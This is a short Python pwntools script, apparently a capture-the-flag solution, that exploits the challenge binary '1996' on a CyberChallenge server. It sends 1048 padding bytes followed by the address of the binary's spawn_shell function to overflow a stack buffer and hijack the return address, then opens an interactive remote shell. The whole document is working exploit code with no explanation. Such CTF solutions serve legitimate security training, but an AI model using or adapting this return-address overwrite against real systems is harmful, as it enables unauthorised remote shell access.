from pwn import *

exe = ELF('../Downloads/1996')
context.binary = exe
HOST = "1996.challs.cyberchallenge.it"
PORT = 9121
p = remote(HOST, PORT)

addr = p64(exe.sym['_Z11spawn_shellv'])
print(addr)

payload = b'A' * 1048
payload += addr

p.sendlineafter(b'Which environment variable do you want to read? ', payload)

p.interactive()
